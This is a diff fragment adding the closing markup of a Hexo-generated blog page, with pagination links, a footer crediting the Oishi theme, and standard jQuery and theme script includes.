+      <a class="extend prev" rel="prev" href="/page/56/">上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/55/">55</a><a class="page-number" href="/page/56/">56</a><span class="page-number current">57</span><a class="page-number" href="/page/58/">58</a><a class="page-number" href="/page/59/">59</a><span class="space">&hellip;</span><a class="page-number" href="/page/101/">101</a><a class="extend next" rel="next" href="/page/58/">下一页</a>
+    </nav>
+  
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
